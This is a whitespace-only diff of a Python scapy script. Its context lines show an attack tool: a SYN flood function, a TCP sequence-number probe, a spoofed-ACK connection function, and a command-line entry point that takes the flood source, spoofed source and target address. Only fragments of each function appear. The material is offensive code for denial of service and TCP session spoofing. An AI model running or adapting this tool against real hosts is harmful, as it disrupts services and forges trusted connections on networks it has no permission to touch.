@@ -3,6 +3,7 @@
 import optparse
 from scapy.all import *
 
+
 def synFlood(src, tgt):
     for sport in range(1024, 65535):
         IPlayer = IP(src=src, dst=tgt)
@@ -10,7 +11,7 @@ def synFlood(src, tgt):
         pkt = IPlayer / TCPlayer
         send(pkt)
 
-
+        
 def calTSN(tgt):
     seqNum = 0
     preNum = 0
@@ -38,8 +39,7 @@ def spoofConn(src, tgt, ack):
     ackPkt = IPlayer / TCPlayer
     send(ackPkt)
 
-
-
+    
 def main():
     parser = optparse.OptionParser('usage %prog -s <src for SYN Flood> -S <src for spoofed connection> -t <target address>')
     parser.add_option('-s', dest='synSpoof', type='string', help='specifc src for SYN Flood')
@@ -62,7 +62,7 @@ def main():
     print('[+] Spoofing Connection.')
     spoofConn(srcSpoof, tgt, seqNum)
     print('[+] Done.')
-
+    
 
 if __name__ == '__main__':
     main()
